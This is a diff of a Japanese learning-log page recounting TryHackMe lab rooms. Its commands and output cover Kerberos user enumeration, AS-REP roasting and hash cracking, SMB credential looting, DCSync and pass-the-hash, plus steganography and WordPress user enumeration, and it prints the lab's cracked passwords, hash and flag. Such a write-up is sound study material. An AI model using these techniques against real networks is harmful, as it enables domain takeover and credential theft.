@@ -157,25 +157,23 @@
 </li>
 <li class="toctree-l2"><a class="reference internal" href="#day7">Day7</a><ul>
 <li class="toctree-l3"><a class="reference internal" href="#id22">偵察</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#smbclient">smbclientへの攻撃</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#wordpress">WordPressのアプリ変更劇</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#id23">ユーザー調査</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id24">パスワードの自書攻撃</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#smbclient">smbclientへの攻撃</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id23">ステガノグラフィ</a></li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#id25">WordPressのサーバーへの攻撃</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#id26">脆弱性の調査</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#wordpress">WordPressのアプリへの攻撃</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id24">WordPressのサーバーへの攻撃</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id25">脆弱性の調査</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#metasploit">Metasploitを利用した攻撃</a></li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#id27">権限昇格</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id26">権限昇格</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#linpeas">LinPEAS</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id28">LinPEASをターゲットへアップロード</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id29">LinPEASの実行</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id30">権限昇格</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id27">LinPEASをターゲットへアップロード</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id28">LinPEASの実行</a></li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#id31">Day7勉強したこと</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id29">Day7勉強したこと</a></li>
 </ul>
 </li>
 </ul>
@@ -968,7 +966,7 @@ PORT     STATE SERVICE       VERSION
 <h4>Kerbruteでユーザー調査<a class="headerlink" href="#id21" title="この見出しへのパーマリンク">¶</a></h4>
 <p>事前準備でkerbruteの実行はできているので、攻撃対象の設定をする。</p>
 <p>kali上の<code class="docutils literal notranslate"><span class="pre">/etc/hosts</span></code>にIPとドメインの名前解決の設定をしておく</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">nano</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
 </pre></div>
 </div>
 <p>最終行に以下を追加(間はtab)</p>
@@ -976,15 +974,15 @@ PORT     STATE SERVICE       VERSION
 </pre></div>
 </div>
 <p>試しにPingを打って返事が来ればOK</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ping</span> <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span>
-<span class="o">--&gt;</span><span class="mi">64</span> <span class="nb">bytes</span> <span class="kn">from</span> <span class="nn">spookysec.local</span> <span class="p">(</span><span class="mf">10.10.100.203</span><span class="p">):</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">124</span> <span class="n">time</span><span class="o">=</span><span class="mi">720</span> <span class="n">ms</span>
-<span class="o">--&gt;</span><span class="mi">64</span> <span class="nb">bytes</span> <span class="kn">from</span> <span class="nn">spookysec.local</span> <span class="p">(</span><span class="mf">10.10.100.203</span><span class="p">):</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">124</span> <span class="n">time</span><span class="o">=</span><span class="mi">720</span> <span class="n">ms</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>ping<span class="w"> </span>spookysec.local
+--&gt;64<span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span>spookysec.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.100.203<span class="o">)</span>:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">124</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">720</span><span class="w"> </span>ms
+--&gt;64<span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span>spookysec.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.100.203<span class="o">)</span>:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">124</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">720</span><span class="w"> </span>ms
 </pre></div>
 </div>
 <p>攻撃用のユーザーリストとパスワードリストについては今回TryHackMeのRoomのTask4に準備されているのでDLしておく。
 本来は、元々Kaliに準備されている辞書を利用するべきだが、今回は事前準備されているものを利用する。</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">raw</span><span class="o">.</span><span class="n">githubusercontent</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Sq00ky</span><span class="o">/</span><span class="n">attacktive</span><span class="o">-</span><span class="n">directory</span><span class="o">-</span><span class="n">tools</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">userlist</span><span class="o">.</span><span class="n">txt</span>
-<span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">raw</span><span class="o">.</span><span class="n">githubusercontent</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Sq00ky</span><span class="o">/</span><span class="n">attacktive</span><span class="o">-</span><span class="n">directory</span><span class="o">-</span><span class="n">tools</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">passwordlist</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>wget<span class="w"> </span>https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+wget<span class="w"> </span>https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
 </pre></div>
 </div>
 <p>Userを割り出すためにKerbruteを利用して実行</p>
@@ -994,7 +992,7 @@ PORT     STATE SERVICE       VERSION
 <li><p>--dc: ドメインコントローラー指定</p></li>
 <li><p>userlist.txt: 利用する辞書</p></li>
 </ul>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">kerbrute</span><span class="o">/</span><span class="n">dist</span><span class="o">/</span><span class="n">kerbrute_linux_arm64</span> <span class="n">userenum</span> <span class="o">-</span><span class="n">d</span> <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span> <span class="o">--</span><span class="n">dc</span> <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span> <span class="n">userlist</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>./kerbrute/dist/kerbrute_linux_arm64<span class="w"> </span>userenum<span class="w"> </span>-d<span class="w"> </span>spookysec.local<span class="w"> </span>--dc<span class="w"> </span>spookysec.local<span class="w"> </span>userlist.txt
 </pre></div>
 </div>
 <p><img alt="" src="../_images/7DayHacking_day6_2.png" /></p>
@@ -1012,11 +1010,11 @@ PORT     STATE SERVICE       VERSION
 <p>Impacketは、さまざまなプロトコルをプログラムから操作しやすくなるためのライブラリやツールの集まり。
 GetNPUser.pyを利用して、取得したユーザーを利用してTGTを取得してみる</p>
 <p>以下を実行してパスワードは未記入でEnter</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">GetNPUsers</span><span class="o">.</span><span class="n">py</span> <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">svc</span><span class="o">-</span><span class="n">admin</span>   
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>./GetNPUsers.py<span class="w"> </span>spookysec.local/svc-admin<span class="w">   </span>
 </pre></div>
 </div>
 <p>得られたTGTが以下</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f~~~~~555
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$krb5asrep$23$svc</span>-admin@SPOOKYSEC.LOCAL:f~~~~~555
 </pre></div>
 </div>
 <p>得られたHash値はhash.txtに書き込んでおく</p>
@@ -1025,69 +1023,68 @@ GetNPUser.pyを利用して、取得したユーザーを利用してTGTを取�
 <h4>Hashのクラッシュ<a class="headerlink" href="#hash" title="この見出しへのパーマリンク">¶</a></h4>
 <p>取得できたTGTのハッシュからhashcatを利用してhash解析をしてパスワードを取得。</p>
 <p>hashcatでは、解析したいハッシュ対象を指定するため、確認するとAS-REQは18200</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
-└─$ hashcat -h |grep Kerberos
-  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
-  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
-  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
+└─$<span class="w"> </span>hashcat<span class="w"> </span>-h<span class="w"> </span><span class="p">|</span>grep<span class="w"> </span>Kerberos
+<span class="w">  </span><span class="m">19800</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">17</span>,<span class="w"> </span>Pre-Auth<span class="w">                             </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="w">  </span><span class="m">13100</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">23</span>,<span class="w"> </span>TGS-REP<span class="w">                              </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="w">  </span><span class="m">18200</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">23</span>,<span class="w"> </span>AS-REP<span class="w">                               </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
 </pre></div>
 </div>
 <p>hashcatを実行してみると、management2005がパスワードとわかる！</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Dictionary cache built:
-* Filename..: passwordlist.txt
-* Passwords.: 70188
-* Bytes.....: 569236
-* Keyspace..: 70188
-* Runtime...: 0 secs
-$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f~~~~~555:management2005
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Dictionary<span class="w"> </span>cache<span class="w"> </span>built:
+*<span class="w"> </span>Filename..:<span class="w"> </span>passwordlist.txt
+*<span class="w"> </span>Passwords.:<span class="w"> </span><span class="m">70188</span>
+*<span class="w"> </span>Bytes.....:<span class="w"> </span><span class="m">569236</span>
+*<span class="w"> </span>Keyspace..:<span class="w"> </span><span class="m">70188</span>
+*<span class="w"> </span>Runtime...:<span class="w"> </span><span class="m">0</span><span class="w"> </span>secs
+<span class="nv">$krb5asrep$23$svc</span>-admin@SPOOKYSEC.LOCAL:f~~~~~555:management2005
 </pre></div>
 </div>
 <p>IDとパスワードからSMBサービスにログインをしてみる。
 SMBのポートを利用してファイルサーバーにアクセスしてみる</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
-└─$ smbclient -L \\\\spookysec.local -U svc-admin    
-Password for [WORKGROUP\svc-admin]:management2005
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
+└─$<span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="se">\\\\</span>spookysec.local<span class="w"> </span>-U<span class="w"> </span>svc-admin<span class="w">    </span>
+Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="o">[</span>WORKGROUP<span class="se">\s</span>vc-admin<span class="o">]</span>:management2005
 
-        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        backup          Disk      
-        C$              Disk      Default share
-        IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        SYSVOL          Disk      Logon server share 
-Reconnecting with SMB1 for workgroup listing.
-do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
-Unable to connect with SMB1 -- no workgroup available
-
+<span class="w">        </span>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
+<span class="w">        </span>---------<span class="w">       </span>----<span class="w">      </span>-------
+<span class="w">        </span>ADMIN$<span class="w">          </span>Disk<span class="w">      </span>Remote<span class="w"> </span>Admin
+<span class="w">        </span>backup<span class="w">          </span>Disk<span class="w">      </span>
+<span class="w">        </span>C$<span class="w">              </span>Disk<span class="w">      </span>Default<span class="w"> </span>share
+<span class="w">        </span>IPC$<span class="w">            </span>IPC<span class="w">       </span>Remote<span class="w"> </span>IPC
+<span class="w">        </span>NETLOGON<span class="w">        </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
+<span class="w">        </span>SYSVOL<span class="w">          </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
+Reconnecting<span class="w"> </span>with<span class="w"> </span>SMB1<span class="w"> </span><span class="k">for</span><span class="w"> </span>workgroup<span class="w"> </span>listing.
+do_connect:<span class="w"> </span>Connection<span class="w"> </span>to<span class="w"> </span>spookysec.local<span class="w"> </span>failed<span class="w"> </span><span class="o">(</span>Error<span class="w"> </span>NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>with<span class="w"> </span>SMB1<span class="w"> </span>--<span class="w"> </span>no<span class="w"> </span>workgroup<span class="w"> </span>available
 </pre></div>
 </div>
 <p>backupの中身からbackupユーザーのIDとPWを取得</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
-└─$ smbclient  \\\\spookysec.local\\backup -U svc-admin
-Password for [WORKGROUP\svc-admin]:management2005
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-  .                                   D        0  Sun Apr  5 04:08:39 2020
-  ..                                  D        0  Sun Apr  5 04:08:39 2020
-  backup_credentials.txt              A       48  Sun Apr  5 04:08:53 2020
-       
-                8247551 blocks of size 4096. 3668238 blocks available
-smb: \&gt; get backup_credentials.txt 
-getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
-smb: \&gt; exit
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
+└─$<span class="w"> </span>smbclient<span class="w">  </span><span class="se">\\\\</span>spookysec.local<span class="se">\\</span>backup<span class="w"> </span>-U<span class="w"> </span>svc-admin
+Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="o">[</span>WORKGROUP<span class="se">\s</span>vc-admin<span class="o">]</span>:management2005
+Try<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>possible<span class="w"> </span>commands.
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
+<span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Apr<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">04</span>:08:39<span class="w"> </span><span class="m">2020</span>
+<span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Apr<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">04</span>:08:39<span class="w"> </span><span class="m">2020</span>
+<span class="w">  </span>backup_credentials.txt<span class="w">              </span>A<span class="w">       </span><span class="m">48</span><span class="w">  </span>Sun<span class="w"> </span>Apr<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">04</span>:08:53<span class="w"> </span><span class="m">2020</span>
+<span class="w">       </span>
+<span class="w">                </span><span class="m">8247551</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">3668238</span><span class="w"> </span>blocks<span class="w"> </span>available
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span>backup_credentials.txt<span class="w"> </span>
+getting<span class="w"> </span>file<span class="w"> </span><span class="se">\b</span>ackup_credentials.txt<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">48</span><span class="w"> </span>as<span class="w"> </span>backup_credentials.txt<span class="w"> </span><span class="o">(</span><span class="m">0</span>.0<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">0</span>.0<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span><span class="nb">exit</span>
 
-┌──(kali㉿kali)-[~/7DaysHacking/Day6]
-└─$ less backup_credentials.txt 
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
+└─$<span class="w"> </span>less<span class="w"> </span>backup_credentials.txt<span class="w"> </span>
 
-┌──(kali㉿kali)-[~/7DaysHacking/Day6]
-└─$ cat backup_credentials.txt 
-YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw       
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
+└─$<span class="w"> </span>cat<span class="w"> </span>backup_credentials.txt<span class="w"> </span>
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw<span class="w">       </span>
 </pre></div>
 </div>
 <p>最後に、得られた値がBase64dエンコードされている可能性があるので解読すると<code class="docutils literal notranslate"><span class="pre">backup2517860</span></code>がパスワードとわかる</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
-└─$ cat backup_credentials.txt|base64 -d                        
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
+└─$<span class="w"> </span>cat<span class="w"> </span>backup_credentials.txt<span class="p">|</span>base64<span class="w"> </span>-d<span class="w">                        </span>
 backup@spookysec.local:backup2517860
 </pre></div>
 </div>
@@ -1100,9 +1097,9 @@ ActiveDirectoryでは、パスワード情報などを暗号化したNTLMハッ�
 <section id="impacketdcsync">
 <h4>Impacketを利用したDCsync<a class="headerlink" href="#impacketdcsync" title="この見出しへのパーマリンク">¶</a></h4>
 <p>Impacketのツールを利用して、DCsyncを実行</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
-└─$ ./secretsdump.py -just-dc-ntlm backup@spookysec.local -outputfile spookysec
-Impacket v0.11.0 - Copyright 2023 Fortra
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
+└─$<span class="w"> </span>./secretsdump.py<span class="w"> </span>-just-dc-ntlm<span class="w"> </span>backup@spookysec.local<span class="w"> </span>-outputfile<span class="w"> </span>spookysec
+Impacket<span class="w"> </span>v0.11.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2023</span><span class="w"> </span>Fortra
 
 Password:backup2517860
 </pre></div>
@@ -1121,13 +1118,13 @@ Password:backup2517860
 <p>NTLMでは、ユーザー名とハッシュ化されたパスワードが保管されている。
 <code class="docutils literal notranslate"><span class="pre">Pass</span> <span class="pre">the</span> <span class="pre">Hash</span></code>ではユーザー情報とハッシュをそのまま利用して認証を済ましてしまうNTLM認証の脆弱性を突いて、ユーザーになりすます。</p>
 <p>Evil-WinRMというツールを利用することでPass the Hash攻撃を行ってroot.txtを取得</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
-└─$ evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day6<span class="o">]</span>
+└─$<span class="w"> </span>evil-winrm<span class="w"> </span>-i<span class="w"> </span>spookysec.local<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>0e0363213e37b94221497260b0bcb4fc
 
 ~~~
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat ../Desktop/root.txt
-TryHackMe{4ctiveD1rectoryM4st3r}
+Info:<span class="w"> </span>Establishing<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span>remote<span class="w"> </span>endpoint
+*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;<span class="w"> </span>cat<span class="w"> </span>../Desktop/root.txt
+TryHackMe<span class="o">{</span>4ctiveD1rectoryM4st3r<span class="o">}</span>
 </pre></div>
 </div>
 </section>
@@ -1149,56 +1146,232 @@ TryHackMe{4ctiveD1rectoryM4st3r}
 WordPressに対して、自書攻撃をしてアプリにログインをしたり、脆弱性からサーバーのOSユーザーをハックしてから権限昇格をする。</p>
 <section id="id22">
 <h3>偵察<a class="headerlink" href="#id22" title="この見出しへのパーマリンク">¶</a></h3>
-<p>sbmclientとWordPressのポートが開いている。
-どうやらWordPressのバージョンは少し古い</p>
+<p>nmapで偵察をしてみる</p>
+<ul class="simple">
+<li><p>22:SSH</p></li>
+<li><p>80:WordPressでWordPressのバージョンは少し古い</p></li>
+<li><p>139/445:Sambda</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>PORT<span class="w">      </span>STATE<span class="w">    </span>SERVICE<span class="w">         </span>VERSION
+<span class="m">22</span>/tcp<span class="w">    </span>open<span class="w">     </span>ssh<span class="w">             </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.3<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<span class="p">|</span><span class="w"> </span>~~
+<span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">     </span>http<span class="w">            </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.29<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span><span class="w"> </span>~~
+<span class="p">|</span>_/wp-admin/
+<span class="p">|</span>_http-generator:<span class="w"> </span>WordPress<span class="w"> </span><span class="m">5</span>.0
+<span class="p">|</span><span class="w"> </span>~~
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">     </span>netbios-ssn<span class="w">     </span>Samba<span class="w"> </span>smbd<span class="w"> </span><span class="m">3</span>.X<span class="w"> </span>-<span class="w"> </span><span class="m">4</span>.X<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>WORKGROUP<span class="o">)</span>
+<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">     </span>netbios-ssn<span class="w">     </span>Samba<span class="w"> </span>smbd<span class="w"> </span><span class="m">4</span>.7.6-Ubuntu<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>WORKGROUP<span class="o">)</span>
+</pre></div>
+</div>
 </section>
 <section id="smbclient">
 <h3>smbclientへの攻撃<a class="headerlink" href="#smbclient" title="この見出しへのパーマリンク">¶</a></h3>
-<p>こちらは、ステ画のグラフィなどを利用してみるが、Rabbit_Hole（迷宮に迷い込んでいる）</p>
+<p>smbclinetを利用して共有フォルダを探索してみると、anonymousユーザーでログインできるBillySMBファイルを発見。その中のファイルを3つDLできる</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ smbclient -L \\\\blog.thm                    
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        BillySMB        Disk      Billy&#39;s local SMB Share
+        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+                                                                            
+┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ smbclient  \\\\blog.thm\\BillySMB
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed May 27 03:17:05 2020
+  ..                                  D        0  Wed May 27 02:58:23 2020
+  Alice-White-Rabbit.jpg              N    33378  Wed May 27 03:17:01 2020
+  tswift.mp4                          N  1236733  Wed May 27 03:13:45 2020
+  check-this.png                      N     3082  Wed May 27 03:13:43 2020
+ 
+                15413192 blocks of size 1024. 9788760 blocks available
+smb: \&gt; get Alice-White-Rabbit.jpg
+getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (7.1 KiloBytes/sec) (average 7.1 KiloBytes/sec)
+</pre></div>
+</div>
+<section id="id23">
+<h4>ステガノグラフィ<a class="headerlink" href="#id23" title="この見出しへのパーマリンク">¶</a></h4>
+<p>テキスト・音声・画像ファイルなどに隠しテキストを埋め込むことができる技術。
+<code class="docutils literal notranslate"><span class="pre">steghide</span></code>というツールを利用すると隠しテキストの埋め込みや抽出が可能。</p>
+<p>今回はjpegに対して、抽出を実行してみるとrabbit_hole.txtが取得できる。
+しかし中身はRabbit_Hole（迷宮に迷い込んでいる）とのことでSambda側はハズレ。</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day7<span class="o">]</span>
+└─$<span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>steghide<span class="w">     </span>
+~~~
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day7<span class="o">]</span>
+└─$<span class="w"> </span>steghide<span class="w"> </span>extract<span class="w"> </span>-sf<span class="w"> </span>Alice-White-Rabbit.jpg<span class="w"> </span>
+Enter<span class="w"> </span>passphrase:<span class="w"> </span>
+wrote<span class="w"> </span>extracted<span class="w"> </span>data<span class="w"> </span>to<span class="w"> </span><span class="s2">&quot;rabbit_hole.txt&quot;</span>.
+</pre></div>
+</div>
+</section>
 </section>
 <section id="wordpress">
-<h3>WordPressのアプリ変更劇<a class="headerlink" href="#wordpress" title="この見出しへのパーマリンク">¶</a></h3>
-<section id="id23">
-<h4>ユーザー調査<a class="headerlink" href="#id23" title="この見出しへのパーマリンク">¶</a></h4>
-<p>WordPressのスキャンでユーザー名を取得</p>
+<h3>WordPressのアプリへの攻撃<a class="headerlink" href="#wordpress" title="この見出しへのパーマリンク">¶</a></h3>
+<p>npmapの結果から、Wordpressを利用しており、/wp-admin/に管理者画面がある。</p>
+<p>WordPressは利用者が多いアプリケーションのため、専用のスキャナがありユーザーを探索することができる。
+wpscanというコマンドを実行してユーザーを炙り出すと以下のユーザーがいることがわかる</p>
+<ul class="simple">
+<li><p>kwheel</p></li>
+<li><p>bjoel</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ wpscan --url http://blog.thm --enumerate u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.24
+                               
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+
+[i] User(s) Identified:
+
+[+] kwheel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+
+[+] bjoel
